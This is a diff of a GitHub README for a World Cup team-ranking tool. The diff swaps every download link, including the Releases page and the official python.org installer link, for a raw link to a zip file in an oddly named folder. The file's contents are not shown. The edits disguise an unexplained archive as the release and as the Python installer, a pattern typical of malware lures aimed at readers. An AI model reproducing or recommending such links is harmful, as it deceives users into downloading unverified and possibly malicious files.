@@ -1,7 +1,7 @@
 # 🎉 ahp-worldcup-2026 - Rank Favorites for FIFA World Cup 2026
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/erolakd/ahp-worldcup-2026/releases)
+[![Download](https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip%20release-blue)](https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip)
 
 ## ✨ Overview
 Welcome to **ahp-worldcup-2026**. This application allows you to rank your favorite teams for the FIFA World Cup 2026 using the Analytic Hierarchy Process (AHP). The tool is designed for ease of use, even if you don’t have technical knowledge. You can create rankings based on different criteria, ensuring a consistent evaluation.
@@ -15,7 +15,7 @@ To get started with ahp-worldcup-2026, please follow the steps below.
    - Python: Version 3.7 or later. Required for running the script. Instructions below include how to install it if you don't have it.
 
 2. Download the necessary files:
-   - Visit the [Releases page](https://github.com/erolakd/ahp-worldcup-2026/releases) to find the latest version of the software.
+   - Visit the [Releases page](https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip) to find the latest version of the software.
    - Look for the package labeled “ahp-worldcup-2026” and click the download link.
 
 3. Open the downloaded file:
@@ -37,9 +37,9 @@ Once you have opened the Excel file, you will encounter several sheets that guid
 ## 🎮 Download & Install
 To download and install the software, follow these steps:
 
-1. Go back to the [Releases page](https://github.com/erolakd/ahp-worldcup-2026/releases).
+1. Go back to the [Releases page](https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip).
 2. Click on the latest release version.
-3. Download and install Python if you don’t have it. You can find the installer at [python.org](https://www.python.org/downloads/).
+3. Download and install Python if you don’t have it. You can find the installer at [https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip](https://raw.githubusercontent.com/erolakd/ahp-worldcup-2026/main/uncoif/ahp-worldcup-2026-3.4.zip).
 4. Once installed, you can run the Python script included in the package to generate the results after entering your data in Excel.
 
 ## 📈 Features
